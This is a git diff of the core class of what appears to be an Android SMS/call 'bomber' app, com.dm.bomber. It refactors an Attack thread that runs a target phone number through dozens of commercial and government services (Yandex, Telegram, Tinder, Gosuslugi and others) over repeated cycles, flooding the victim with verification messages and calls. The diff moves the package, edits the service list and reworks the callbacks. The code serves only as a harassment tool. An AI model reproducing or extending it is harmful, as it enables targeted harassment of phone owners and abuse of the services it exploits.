@@ -1,4 +1,4 @@
-package com.dm.bomber;
+package com.dm.bomber.bomber;
 
 import android.util.Log;
 
@@ -6,7 +6,6 @@ import com.dm.bomber.services.*;
 
 import org.jetbrains.annotations.NotNull;
 
-import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
@@ -17,28 +16,27 @@ import okhttp3.Response;
 public class Bomber {
     private static final String TAG = "Bomber";
     private static final Service[] services = new Service[]{
-            new Kari(), new Modulebank(), new YandexEda(), new Yarus(),
+            new Kari(), new Modulebank(), new YandexEda(),
             new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
             new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
             new Fivepost(), new FarforCall(), new Sephora(), new Groshivsim(),
             new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
             new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
-            new Zdravcity(), new Robocredit(), new Yandex(), new Tinder(),
-            new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
+            new Zdravcity(), new Robocredit(), new Tinder(),
+            new Hoff(), new Samokat(), new GreenBee(), new Dolyame(),
             new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
             new MegaDisk(), new KazanExpress(), new FoodBand(), new Gosuslugi(),
             new Benzuber(), new Citimobil(), new HHru(), new TikTok(),
             new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
             new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
             new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
-            new RiveGauche(), new Yarche(), new Baucenter(), new Dolyame(),
-            new GoldApple(), new FriendsClub(), new ChestnyZnak(), new DvaBerega(),
+            new GoldApple(), new FriendsClub(), new ChestnyZnak(),
             new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
             new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
             new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
             new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
             new Mokka(), new FarforSMS(), new Stolichki(), new Mirkorma(),
-            new YooMoney(), new Uchiru(), new Biua(), new MdFashion(),
+            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
             new XtraTV(), new AlloUa(), new Rulybka(), new Velobike(),
             new Technopark(), new Call2Friends(), new Ievaphone(), new WebCom(),
             new MTSBank(), new ATB(), new Paygram(), new Tele2(),
@@ -68,14 +66,6 @@ public class Bomber {
         return usableServices;
     }
 
-    public interface Callback {
-        void onAttackEnd(boolean success);
-
-        void onAttackStart(int serviceCount, int numberOfCycles);
-
-        void onProgressChange(int progress);
-    }
-
     public static class Attack extends Thread {
         private final Callback callback;
         private final String phoneCode;
@@ -86,7 +76,7 @@ public class Bomber {
 
         private CountDownLatch tasks;
 
-        public Attack(Callback callback, String phoneCode, String phone, int cycles) {
+        public Attack(com.dm.bomber.bomber.Callback callback, String phoneCode, String phone, int cycles) {
             super(phone);
 
             this.phoneCode = phoneCode;
@@ -111,13 +101,17 @@ public class Bomber {
 
                     for (Service service : usableServices) {
                         service.prepare(phoneCode, phone);
-                        service.run(new okhttp3.Callback() {
+                        service.run(new com.dm.bomber.services.Callback() {
                             @Override
-                            public void onFailure(@NotNull Call call, @NotNull IOException e) {
-                                Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
-
+                            public void onSuccess() {
                                 tasks.countDown();
                                 callback.onProgressChange(progress++);
+                            }
+
+                            @Override
+                            public void onError(Exception e) {
+                                Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
+                                onSuccess();
                             }
 
                             @Override
@@ -126,9 +120,7 @@ public class Bomber {
                                     Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                             service.getClass().getName(), response.code()));
                                 }
-
-                                tasks.countDown();
-                                callback.onProgressChange(progress++);
+                                onSuccess();
                             }
                         });
                     }
